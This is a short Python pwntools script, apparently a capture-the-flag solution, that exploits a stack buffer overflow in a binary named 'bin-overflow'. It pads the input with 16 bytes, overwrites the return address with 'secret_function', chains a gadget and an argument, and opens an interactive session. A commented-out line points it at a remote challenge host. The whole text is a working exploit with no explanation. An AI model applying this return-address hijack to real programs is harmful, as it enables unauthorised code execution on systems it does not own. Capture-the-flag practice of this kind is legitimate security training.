from pwn import *


#p = remote('hack.bckdr.in', 8013)
p = process('./bin-overflow')
elf = ELF('./bin-overflow')

offset = 16
pr = 0x08048311
secrete_func = elf.symbols['secret_function']
p.recvuntil('it')
payload = ""
payload += "A"*16
payload += p32(secrete_func)
payload += p32(pr)
payload += p32(0x2e4a)
print(payload)
p.sendline(payload)
p.recv(1024)
p.interactive()